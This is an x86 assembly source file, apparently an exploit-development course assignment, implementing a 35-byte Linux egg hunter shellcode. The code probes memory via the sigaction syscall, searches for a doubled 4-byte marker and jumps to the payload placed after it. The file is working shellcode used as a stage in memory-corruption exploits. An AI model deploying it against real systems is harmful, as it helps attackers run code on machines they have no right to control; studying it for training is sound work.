; Author :      Demey Alexandre (PA-14186)
; Date :        03-05-2020
; 
; Description : SLAE assignment #3 - Egg hunter shellcode
;               Look in memory for the egg 0x90509050 repeated twice,
;               Then redirect code execution flow to the address following the egg.
;
; Shellcode length : 35 bytes


global _start

section .text

_start:

    xor ebx, ebx        ; set ebx to an invalid signal number
    cld                 ; Ensure that we search in memory in the reverse stack order
			            ; from lower to higher memory address

next_page:
    or cx, 0xfff        ; Set ecx pointing to the last byte of the current page

next_address:
    inc ecx             ; Next offset, and next page if cx is set to 0x0fff			
    jz next_page        ; if ecx set to 0x0, go to the next page
    
    push byte 0x43      ; sigaction syscall number
    pop eax
    int 0x80         

    cmp al, 0xf2        ; check if EFAULT
    jz next_page        ; if EFAULT go to next page

    mov eax, 0x50905090 ; set eax to our egg signature value
    mov edi, ecx        ; set edi to point to the address we want to check

    scasd               ; test for the first four bytes of the egg
                        ; scasd compare eax with bytes at the address set in edi,
                        ; then increment the edi register (DF is set to 0)
    jnz next_address    ; if it's not our egg signature go to the next address

    scasd               ; test for the four last bytes of the egg
    jnz next_address    ; if it's not go to the next address

    jmp edi             ; Jump to our true payload,
                        ; The address following our egg
